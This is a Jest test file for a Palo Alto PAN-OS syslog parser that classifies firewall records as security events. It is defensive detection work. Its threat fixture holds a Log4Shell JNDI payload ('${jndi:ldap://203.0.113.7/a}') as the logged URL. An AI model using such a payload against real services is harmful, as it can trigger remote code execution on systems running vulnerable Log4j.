import { describe, expect, test } from "@jest/globals";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import SecurityLogFormat, {
  SECURITY_LOG_FORMAT_ATTRIBUTE,
} from "../../../../Types/SecurityEvent/SecurityLogFormat";
import PaloAltoLogParser, {
  PALO_ALTO_BLOCK_ACTIONS,
  PALO_ALTO_FIELDS,
  PALO_ALTO_PREFILTER_GROUPS,
  PALO_ALTO_THREAT_SUBTYPES,
  PaloAltoLogType,
  readPaloAltoRecord,
  readPanOsThreat,
  splitPanOsFields,
} from "../../../../Utils/SecurityEvent/LogParsers/PaloAltoLogParser";
import SecurityLogParser, {
  matchesSecurityLogPrefilter,
} from "../../../../Utils/SecurityEvent/LogParsers/SecurityLogParser";
import { FastestRun, fastestRun } from "../../../Helpers/FastestRun";
import { SeededRandom, seededRandom } from "../../../Helpers/SeededRandom";
import { PAN_FORMATS, PAN_LINES, PAN_SERIAL, panRecord } from "./FirewallFixtures";
import { logLine } from "./LogParserFixtures";

/*
 * Palo Alto Networks' own syslog: a record of each log type PAN-OS writes,
 * built from the documented Format lines (FirewallFixtures), becomes the
 * security event its kind is - or stays a log - with its fields under
 * PAN-OS's own names, and every line kept passes the database's prefilter.
 */

function parse(line: string): Array<NormalizedSecurityEvent> {
  return PaloAltoLogParser.parse(logLine(line));
}

function only(line: string): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> = parse(line);

  expect(events).toHaveLength(1);

  return events[0]!;
}

// A documented name as PAN-OS's variable name for it.
const VARIABLE_NAMES: Record<string, string> = {
  "Receive Time": "receive_time",
  "Serial Number": "serial",
  Type: "type",
  "Threat/Content Type": "subtype",
  "Generated Time": "time_generated",
  "Source Address": "src",
  "Destination Address": "dst",
  "NAT Source IP": "natsrc",
  "NAT Destination IP": "natdst",
  "Rule Name": "rule",
  "Source User": "srcuser",
  "Destination User": "dstuser",
  Application: "app",
  "Virtual System": "vsys",
  "Source Zone": "from",
  "Destination Zone": "to",
  "Inbound Interface": "inbound_if",
  "Outbound Interface": "outbound_if",
  "Log Action": "logset",
  "Session ID": "sessionid",
  "Repeat Count": "repeatcnt",
  "Source Port": "sport",
  "Destination Port": "dport",
  "NAT Source Port": "natsport",
  "NAT Destination Port": "natdport",
  Flags: "flags",
  Protocol: "proto",
  Action: "action",
  Bytes: "bytes",
  "Bytes Sent": "bytes_sent",
  "Bytes Received": "bytes_received",
  Packets: "packets",
  "Start Time": "start",
  "Elapsed Time": "elapsed",
  Category: "category",
  "Sequence Number": "seqno",
  "Action Flags": "actionflags",
  "Source Country": "srcloc",
  "Destination Country": "dstloc",
  "Source Location": "srcloc",
  "Destination Location": "dstloc",
  "Packets Sent": "pkts_sent",
  "Packets Received": "pkts_received",
  "Session End Reason": "session_end_reason",
  "URL/Filename": "misc",
  "Threat ID": "threatid",
  Severity: "severity",
  Direction: "direction",
  "Content Type": "contenttype",
  PCAP_ID: "pcap_id",
  "File Digest": "filedigest",
  Cloud: "cloud",
  "URL Index": "url_idx",
  "User Agent": "user_agent",
  "File Type": "filetype",
  "X-Forwarded-For": "xff",
  Referer: "referer",
  Sender: "sender",
  Subject: "subject",
  Recipient: "recipient",
  "Report ID": "reportid",
  "Event ID": "eventid",
  Stage: "stage",
  "Authentication Method": "auth_method",
  "Tunnel Type": "tunnel_type",
  "Source Region": "srcregion",
  "Machine Name": "machinename",
  "Public IP": "public_ip",
  "Public IPv6": "public_ipv6",
  "Private IP": "private_ip",
  "Private IPv6": "private_ipv6",
  "Host ID": "hostid",
  "Client Version": "client_ver",
  "Client OS": "client_os",
  "Client OS Version": "client_os_ver",
  Reason: "reason",
  Error: "error",
  Description: "opaque",
  Status: "status",
  Location: "location",
  "Login Duration": "login_duration",
  "Connect Method": "connect_method",
  "Error Code": "error_code",
  Portal: "portal",
  Object: "object",
  Module: "module",
  Host: "host",
  Command: "cmd",
  Admin: "admin",
  Client: "client",
  Result: "result",
  "Configuration Path": "path",
  "Before Change Detail": "before_change_detail",
  "After Change Detail": "after_change_detail",
};

describe("PaloAltoLogParser - each log type's fields, in PAN-OS's documented order", () => {
  test.each([
    PaloAltoLogType.Traffic,
    PaloAltoLogType.Threat,
    PaloAltoLogType.GlobalProtect,
    PaloAltoLogType.System,
    PaloAltoLogType.Config,
  ])("%s's layout names each documented field where PAN-OS writes it", (type: PaloAltoLogType) => {
    const documented: Array<string> = PAN_FORMATS[type]!;
    const layout: ReadonlyArray<string> = PALO_ALTO_FIELDS.get(type)!;

    layout.forEach((name: string, index: number): void => {
      const documentedName: string = documented[index]!;

      if (documentedName === "FUTURE_USE") {
        expect([index, name]).toEqual([index, ""]);
        return;
      }

      // The second Serial Number of a GlobalProtect record is the client's.
      if (type === PaloAltoLogType.GlobalProtect && index === 20) {
        expect(name).toBe("serialnumber");
        return;
      }

      expect([index, documentedName, name]).toEqual([
        index,
        documentedName,
        VARIABLE_NAMES[documentedName],
      ]);
    });
  });

  test("a record reads every field it was given, by its PAN-OS name", () => {
    const record: { type: string; fields: Record<string, string> } =
      readPaloAltoRecord(PAN_LINES.threatVulnerability)!;

    expect(record.type).toBe(PaloAltoLogType.Threat);
    expect(record.fields).toMatchObject({
      serial: PAN_SERIAL,
      type: "THREAT",
      subtype: "vulnerability",
      src: "203.0.113.7",
      dst: "192.0.2.20",
      rule: "allow-web",
      app: "web-browsing",
      sport: "52314",
      dport: "80",
      proto: "tcp",
      action: "reset-both",
      misc: "/index.php?x=${jndi:ldap://203.0.113.7/a}",
      threatid: "Apache Log4j Remote Code Execution Vulnerability(91991)",
      severity: "critical",
      seqno: "7000001234",
    });
  });

  test("a quoted field keeps its commas, and a doubled quote is one quote", () => {
    expect(splitPanOsFields('1,"a, b",c,"say ""hi""",')).toEqual([
      "1",
      "a, b",
      "c",
      'say "hi"',
      "",
    ]);
  });

  test("a record is found after any syslog header, or none", () => {
    for (const header of [
      "",
      "<14>Oct 30 10:00:00 PA-3220 ",
      "<14>1 2026-10-30T10:00:00Z PA-3220 - - - - ",
      "Oct 30 10:00:00 PA-3220:",
      "Oct 30 10:00:00 PA-3220: ",
    ]) {
      const line: string = panRecord(
        "TRAFFIC",
        {
          "Threat/Content Type": "deny",
          "Source Address": "203.0.113.99",
          "Destination Address": "192.0.2.5",
          Action: "deny",
        },
        { header },
      );

      expect([header, readPaloAltoRecord(line)?.fields["src"]]).toEqual([
        header,
        "203.0.113.99",
      ]);
    }
  });

  test("a line that only looks like one is not a record", () => {
    for (const line of [
      "THREAT detected on the firewall",
      "1,yesterday,012801000000,THREAT,virus,",
      "1,2026/10/30 10:00:00,serial with spaces,THREAT,virus,",
      "12345678901,2026/10/30 10:00:00,012801000000,THREAT,virus,",
      "1,2026/10/30 10:00:00,,THREAT,virus,",
      "",
    ]) {
      expect([line, readPaloAltoRecord(line)]).toEqual([line, null]);
    }
  });
});

describe("PaloAltoLogParser - what becomes a security event", () => {
  test("a threat the firewall found is a Detection Finding with its own name, id and severity", () => {
    const event: NormalizedSecurityEvent = only(PAN_LINES.threatVulnerability);

    expect(event).toMatchObject({
      className: "Detection Finding",
      activityName: "Create",
      statusName: "Blocked",
      severityName: "Critical",
      ruleName: "Apache Log4j Remote Code Execution Vulnerability",
      ruleId: "91991",
      vendorName: "Palo Alto Networks",
      productName: "PAN-OS",
      principalIp: "203.0.113.7",
      targetIp: "192.0.2.20",
      targetPort: 80,
      targetResource: "/index.php?x=${jndi:ldap://203.0.113.7/a}",
      eventUid: `panos:${PAN_SERIAL}:THREAT:7000001234`,
    });
    expect(event.message).toBe(
      "Apache Log4j Remote Code Execution Vulnerability from 203.0.113.7 to 192.0.2.20:80 (reset-both)",
    );
    expect(event.attributes[SECURITY_LOG_FORMAT_ATTRIBUTE]).toBe(
      SecurityLogFormat.PaloAlto,
    );
    expect(event.attributes["panos.threatid"]).toBe(
      "Apache Log4j Remote Code Execution Vulnerability(91991)",
    );
  });

  test("spyware sinkholed and a virus only alerted on are findings too, whatever was done", () => {
    const spyware: NormalizedSecurityEvent = only(PAN_LINES.threatSpyware);
    const virus: NormalizedSecurityEvent = only(PAN_LINES.threatVirus);

    expect([spyware.ruleName, spyware.statusName, spyware.severityName]).toEqual([
      "Cobalt Strike Beacon C2",
      "Blocked",
      "High",
    ]);
    expect(spyware.principalUser).toBe("corp\\alice");
    expect([virus.ruleName, virus.statusName, virus.severityName]).toEqual([
      "Virus/Win32.WGeneric.abc",
      "Detected",
      "Medium",
    ]);
    expect(virus.targetUser).toBe("corp\\bob");
  });

  test("a WildFire verdict is a finding unless it is benign", () => {
    expect(only(PAN_LINES.threatWildfireMalicious).severityName).toBe("High");
    expect(parse(PAN_LINES.threatWildfireBenign)).toEqual([]);
  });

  test("a URL blocked is a refused request; one only alerted on stays a log", () => {
    const blocked: NormalizedSecurityEvent = only(PAN_LINES.threatUrlBlocked);

    expect(blocked).toMatchObject({
      className: "HTTP Activity",
      activityName: "Request",
      statusName: "Blocked",
      targetResource: "malware.example/payload",
      principalUser: "corp\\alice",
    });
    expect(blocked.message).toBe(
      "Request to malware.example/payload blocked from 192.0.2.10 (malware)",
    );
    expect(parse(PAN_LINES.threatUrlAlert)).toEqual([]);
  });

  test("a file blocked by a profile is a finding; one only logged stays a log", () => {
    expect(only(PAN_LINES.threatFileBlocked)).toMatchObject({
      className: "Detection Finding",
      statusName: "Blocked",
      ruleName: "PowerShell Script 1",
      targetResource: "tool.ps1",
    });
    expect(parse(PAN_LINES.threatFileAlert)).toEqual([]);
  });

  test("a connection denied or reset is refused network activity; an allowed one stays a log", () => {
    expect(only(PAN_LINES.trafficDeny)).toMatchObject({
      className: "Network Activity",
      activityName: "Refuse",
      statusName: "Blocked",
      severityName: "Low",
      principalIp: "203.0.113.99",
      targetIp: "192.0.2.5",
      targetPort: 3389,
      targetResource: "deny-rdp",
      message: "ms-rdp from 203.0.113.99 to 192.0.2.5:3389 blocked (deny, rule deny-rdp)",
    });
    expect(only(PAN_LINES.trafficResetBoth).statusName).toBe("Blocked");
    expect(parse(PAN_LINES.trafficAllow)).toEqual([]);
  });

  test("a GlobalProtect sign-in, failed or not, is an Authentication; a tunnel coming up is not one", () => {
    expect(only(PAN_LINES.globalProtectFailed)).toMatchObject({
      className: "Authentication",
      activityName: "Logon",
      statusName: "Failure",
      severityName: "Low",
      principalUser: "alice",
      principalIp: "203.0.113.44",
      principalHost: "WKS-07",
      targetHost: "GP-Portal",
      message:
        "Failed GlobalProtect sign-in for alice from 203.0.113.44 to GP-Portal: Authentication failed: Invalid username or password",
    });
    expect(only(PAN_LINES.globalProtectSignedIn)).toMatchObject({
      statusName: "Success",
      severityName: "Informational",
      principalUser: "bob",
    });
    expect(parse(PAN_LINES.globalProtectConnected)).toEqual([]);
  });

  test("an administrator signing in to the firewall, failed or not, is an Authentication; a routing message is not", () => {
    expect(only(PAN_LINES.systemAuthFail)).toMatchObject({
      className: "Authentication",
      statusName: "Failure",
      principalUser: "admin",
      principalIp: "203.0.113.7",
      targetHost: PAN_SERIAL,
      message: `Failed administrator sign-in for admin from 203.0.113.7 on the firewall ${PAN_SERIAL}`,
    });
    expect(only(PAN_LINES.systemLoggedIn)).toMatchObject({
      statusName: "Success",
      principalUser: "admin",
      principalIp: "198.51.100.23",
    });
    expect(parse(PAN_LINES.systemRouting)).toEqual([]);
  });

  test("an administrator's configuration change is API Activity, failed ones Low", () => {
    expect(only(PAN_LINES.configSet)).toMatchObject({
      className: "API Activity",
      activityName: "set",
      statusName: "Success",
      severityName: "Informational",
      principalUser: "admin",
      principalIp: "198.51.100.23",
      targetResource: "vsys vsys1 rulebase security rules allow-any-any",
    });
    expect(only(PAN_LINES.configCommitFailed)).toMatchObject({
      activityName: "commit",
      statusName: "Failure",
      severityName: "Low",
      principalUser: "carol",
    });
  });

  test("a threat's name and id are read as PAN-OS writes them", () => {
    expect(readPanOsThreat("Eicar Test File(39040)")).toEqual({
      name: "Eicar Test File",
      id: "39040",
    });
    expect(readPanOsThreat("Windows Executable (EXE)(52020)")).toEqual({
      name: "Windows Executable (EXE)",
      id: "52020",
    });
    expect(readPanOsThreat("No id here")).toEqual({
      name: "No id here",
      id: "",
    });
    expect(readPanOsThreat("Bad(id)")).toEqual({ name: "Bad(id)", id: "" });
  });

  test("the whole parser chain reads a PAN-OS record as PAN-OS, not as the web attack inside it", () => {
    const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
      logLine(PAN_LINES.threatVulnerability),
    );

    expect(events).toHaveLength(1);
    expect(events[0]!.attributes[SECURITY_LOG_FORMAT_ATTRIBUTE]).toBe(
      SecurityLogFormat.PaloAlto,
    );
  });
});

describe("PaloAltoLogParser - the database's prefilter holds every record kept", () => {
  test.each(Object.entries(PAN_LINES))("%s", (_name: string, line: string) => {
    if (parse(line).length > 0) {
      expect(matchesSecurityLogPrefilter(line)).toBe(true);
    }
  });

  test("its words are lowercase, each group within what one query takes", () => {
    for (const group of PALO_ALTO_PREFILTER_GROUPS) {
      for (const word of [group.requires, ...group.anyOf]) {
        expect(word).toBe(word.toLowerCase());
      }

      expect(group.anyOf.length).toBeLessThan(255);
    }
  });

  test("across thousands of generated records of every type, subtype, action and quoting", () => {
    const random: SeededRandom = seededRandom(9101);
    const pick: (items: ReadonlyArray<string>) => string = (
      items: ReadonlyArray<string>,
    ): string => {
      return items[random(items.length)]!;
    };
    const types: Array<string> = [
      "TRAFFIC",
      "THREAT",
      "GLOBALPROTECT",
      "SYSTEM",
      "CONFIG",
    ];
    const subtypes: Array<string> = [
      ...PALO_ALTO_THREAT_SUBTYPES,
      "wildfire",
      "url",
      "file",
      "data",
      "start",
      "end",
      "deny",
      "drop",
      "auth",
      "general",
      "0",
    ];
    const actions: Array<string> = [
      ...PALO_ALTO_BLOCK_ACTIONS,
      "allow",
      "alert",
      "Allow",
      " deny",
      "deny ",
      "",
    ];
    const words: Array<string> = [
      "gateway-auth",
      "portal-auth",
      "gateway-connected",
      "auth-fail",
      "auth-success",
      "general",
      "failed authentication for user 'admin'. From: 203.0.113.7.",
      "User admin logged in via Web from 198.51.100.23 using https",
      "Submitted",
      "Failed",
      "Succeeded",
      "Unauthorized",
      "failure",
      "success",
      "benign",
      "malicious",
      "a, b",
      'quoted "word"',
      "",
    ];
    let kept: number = 0;

    for (let index: number = 0; index < 20000; index++) {
      const type: string = pick(types);
      const values: Record<string, string> = {
        "Threat/Content Type": pick(subtypes),
        Action: pick(actions),
        "Source Address": "203.0.113.7",
        "Destination Address": "192.0.2.5",
        "Event ID": pick(words),
        Description: pick(words),
        Status: pick(words),
        Result: pick(words),
        Category: pick(words),
        "Threat ID": "Something(1234)",
      };
      const line: string = panRecord(type, values, {
        header: pick(["", "<14>Oct 30 10:00:00 PA-3220 "]),
      });

      if (parse(line).length > 0) {
        kept++;
        expect([line, matchesSecurityLogPrefilter(line)]).toEqual([line, true]);
      }
    }

    expect(kept).toBeGreaterThan(3000);
  });
});

describe("PaloAltoLogParser - a long line is read in time in line with it", () => {
  test("a record of 400,000 characters in one quoted field, and a line of 400,000 commas", () => {
    const longField: string = panRecord("THREAT", {
      "Threat/Content Type": "virus",
      "URL/Filename": `"${"a,".repeat(200000)}"`,
      Action: "alert",
    });
    const commas: string = `1,2026/10/30 10:00:00,${PAN_SERIAL},THREAT,virus,${",".repeat(400000)}`;
    const markers: string = ",THREAT,".repeat(50000);

    const result: FastestRun<void> = fastestRun({
      run: (): void => {
        parse(longField);
        parse(commas);
        parse(markers);
      },
      limitInMs: 2000,
    });

    expect(result.inMs).toBeLessThan(2000);
  });
});
